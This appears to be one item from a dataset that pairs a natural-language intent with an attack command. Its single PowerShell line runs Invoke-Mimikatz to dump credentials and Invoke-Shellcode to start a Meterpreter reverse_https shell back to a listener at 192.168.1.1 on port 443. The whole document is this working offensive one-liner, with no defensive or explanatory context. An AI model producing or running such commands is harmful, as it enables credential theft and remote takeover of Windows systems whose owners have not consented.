# Natural language intent:
# Invoke Mimikatz to dump credentials and execute a Meterpreter payload

Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.1 -Lport 443
